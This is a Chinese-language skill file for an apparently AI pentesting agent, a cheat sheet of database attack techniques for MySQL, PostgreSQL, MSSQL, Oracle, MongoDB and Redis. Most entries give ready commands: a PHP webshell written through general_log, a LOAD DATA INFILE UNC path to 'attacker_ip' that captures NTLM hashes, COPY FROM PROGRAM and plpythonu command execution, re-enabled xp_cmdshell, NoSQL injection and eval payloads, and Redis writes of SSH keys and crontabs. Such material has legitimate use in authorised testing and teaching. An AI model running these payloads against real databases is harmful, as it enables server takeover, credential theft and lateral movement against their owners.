---
name: pentest-database
description: "数据库渗透：MySQL/PostgreSQL/MSSQL/Oracle/NoSQL——假设驱动的信号→动作速查表"
allowed-tools: Read,Grep,Glob,Bash
---

# Database Pentest

> 仅在根路由选择本目录后读取。每个条目都是待验证的检查假设；执行前用当前一手证据确认适用性。

**触发**: 目标暴露数据库端口或已获数据库凭据/连接串。

## 领域决策直觉

1. 数据库即跳板：拿到数据库权限后不要只是 dump 数据——评估 OS 命令执行和横向移动可能性
2. 每种数据库有独特的 OS 逃逸路径：MySQL 的 general_log、PostgreSQL 的 COPY PROGRAM、MSSQL 的 xp_cmdshell——先确认数据库类型再选策略
3. 链式横向（MSSQL Linked Server / MySQL FEDERATED）可将数据库变成内网代理

---

## MySQL

### Rogue MySQL Server 客户端攻击
- **信号**: 目标应用作为 MySQL 客户端连接到外部（或连接字符串可控）
- **假设**: MySQL 客户端协议的 LOCAL DATA INFILE 可被服务端被动利用窃取客户端文件
- **验证**: 启动恶意 MySQL 服务器 → 客户端连接时回复 xFB + 目标文件路径 → 客户端自动 LOCAL INFILE 发送文件内容 → 无需客户端任何操作
- **证实**: 接收到客户端的 /etc/passwd 或源码文件
- **升级**: 敏感文件窃取 → 凭据发现 → 横向移动

### FEDERATED 引擎链式横向（A→B→C）
- **信号**: MySQL 存在 FEDERATED 引擎且可访问
- **假设**: FEDERATED 引擎可级联创建多级横向表，将 MySQL 变为内网代理
- **验证**: CREATE SERVER 定义远程 MySQL → CREATE TABLE ENGINE=FEDERATED CONNECTION 指向远程 → 像查询本地表一样查询远程数据 → 级联 A→B→C 多级 → 响应时间差判断内网端口是否开放
- **证实**: 成功读取远程 MySQL 数据库内容
- **升级**: 多跳横向 → 从数据库渗透到应用服务器

### general_log 写 Webshell（非传统路径）
- **信号**: MySQL 有 FILE 权限但 secure_file_priv 为空（INTO OUTFILE 被禁）
- **假设**: general_log 可将 SQL 语句写入任意文件，比 INTO OUTFILE 更隐蔽
- **验证**: `SET global general_log_file='/var/www/html/shell.php'` → `SET global general_log=ON` → `SELECT '<?php system($_GET["c"]);?>'` → general_log 写入 SQL 语句到日志文件 → 日志文件即 Webshell
- **证实**: 访问 /shell.php?c=id 返回命令输出
- **升级**: Webshell → 服务器控制 → 内网横向

### MySQL UNC Path NTLM 窃取
- **信号**: 目标 MySQL 运行在 Windows 上
- **假设**: LOAD DATA INFILE/LOAD_FILE 触发 UNC 路径解析 → SMB 认证 → NTLMv2 哈希泄露
- **验证**: `LOAD DATA INFILE '\\\\attacker_ip\\share\\file'` → 触发 UNC 路径解析 → SMB 认证 → Responder 捕获 NTLMv2 哈希 → 域环境机器账户可用于 RBCD 攻击
- **证实**: Responder 收到 NTLMv2 哈希
- **升级**: NTLM 哈希破解/Relay → 域横向

---

## PostgreSQL

### COPY PROGRAM RCE
- **信号**: PostgreSQL 9.3+ superuser
- **假设**: COPY FROM PROGRAM 可直接执行 OS 命令并捕获输出
- **验证**: `CREATE TABLE cmd(cmd_output text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd;` → shell 命令输出直接写入表
- **证实**: 表中返回 id 命令输出
- **升级**: OS 命令执行 → 反弹 Shell → 服务器控制

### PL/PythonU RCE + Large Object UDF
- **信号**: PostgreSQL superuser 且 plpythonu 扩展可用
- **假设**: 存储过程语言可直接执行 OS 命令。如扩展不可用，Large Object + libc UDF 可选
- **验证**: `CREATE EXTENSION plpythonu; CREATE FUNCTION exec(cmd text) RETURNS text AS $$ import subprocess; return subprocess.check_output(cmd, shell=True) $$ LANGUAGE plpythonu;` → 备选：Large Object 导出 + 编译 UDF 利用 libc 系统库（不引入外部文件）
- **证实**: exec('id') 返回命令输出
- **升级**: OS 命令执行 → 后渗透

---

## MSSQL

### xp_cmdshell 启用 + OLE Automation 替代
- **信号**: MSSQL 有 sysadmin 或 CONTROL SERVER
- **假设**: xp_cmdshell 被禁用但可重新启用，或 OLE Automation 替代
- **验证**: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';` → 替代：`sp_OACreate 'WScript.Shell'` OLE Automation → sp_OAMethod 执行命令
- **证实**: 命令执行成功返回输出
- **升级**: OS 控制 → 内网横向

### Linked Server 多级链式横向
- **信号**: MSSQL 存在 Linked Server 配置
- **假设**: Linked Server 可级联形成 A→B→C→Z 链，逐跳执行命令
- **验证**: `SELECT * FROM sys.servers` 发现 Linked Server → OPENQUERY / EXECUTE AT 在远程执行 → 每跳启用 xp_cmdshell → 多级链式 A→B→C→Z → 跨森林信任利用
- **证实**: 链式第 N 跳成功执行命令
- **升级**: 逐跳渗透 → 跨域/跨森林访问

### MSSQL 凭据提取 + CLR 程序集 RCE
- **信号**: MSSQL dbo 权限或拥有 CREATE ASSEMBLY 权限
- **假设**: CLR 程序集可加载 .NET 代码实现 RCE。数据库凭据可提取用于横向
- **验证**: 提取数据库链接密码 → 创建 CLR 程序集 `CREATE ASSEMBLY [Shell] FROM <hex_assembly>` → 创建存储过程调用 CLR → EXEC 执行命令
- **证实**: CLR 程序集成功执行 OS 命令
- **升级**: OS 控制 + 凭据横向 → 双路径

---

## Oracle

### DBMS_SCHEDULER / Java Stored Procedure RCE
- **信号**: Oracle DBA 或 CREATE ANY PROCEDURE 权限
- **假设**: DBMS_SCHEDULER 可创建外部 job 执行 OS 命令。Java Stored Procedure 备选
- **验证**: `BEGIN DBMS_SCHEDULER.CREATE_JOB(..., job_type=>'EXECUTABLE', ...); END;` → 备选：`CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand"` → 调用 Runtime.getRuntime().exec()
- **证实**: OS 命令执行成功
- **升级**: 服务器控制 → 内网横向

### Oracle TNS Poisoning + 跨数据库横向
- **信号**: Oracle TNS Listener 可访问
- **假设**: TNS Listener 可被投毒重定向到恶意数据库获取认证凭据。DB Link 可横向
- **验证**: TNS Listener 配置投毒 → 客户端连接重定向 → 捕获认证凭据 → 如有 DB Link：`SELECT * FROM table@remote_db` 跨数据库访问
- **证实**: 捕获到数据库凭据或跨库查询成功
- **升级**: 凭据横向 → 多数据库控制

---

## NoSQL

### MongoDB NoSQL 注入 + 系统命令执行
- **信号**: MongoDB 接收 JSON 查询参数且未做严格类型过滤
- **假设**: $where/$regex/$ne 操作符可注入，进而触发系统命令执行
- **验证**: `{"$where": "sleep(5000)"}` 时间盲注 → `{"username": {"$ne": ""}}` 认证绕过 → 如获 admin：`db.runCommand({eval: "require('child_process').exec('id')"})` 或 `$function` 操作符
- **证实**: 认证绕过成功或命令执行返回结果
- **升级**: 数据库控制 → 数据窃取 → 服务器控制（如有 shell 路径）

### Redis 未授权 → RCE 多条路径
- **信号**: Redis 端口 6379 未认证可访问
- **假设**: Redis 可通过多种方式实现 RCE
- **验证**: (1) 写 SSH 公钥 `config set dir /root/.ssh; config set dbfilename authorized_keys` (2) 写 crontab 定时任务 (3) 写 Webshell 到 Web 目录 (4) 主从复制 `SLAVEOF` 同步恶意模块 (5) Redis 模块加载 `MODULE LOAD /path/to/module.so`
- **证实**: 通过 SSH/cron/Webshell 获得 shell
- **升级**: 服务器控制 → 内网横向
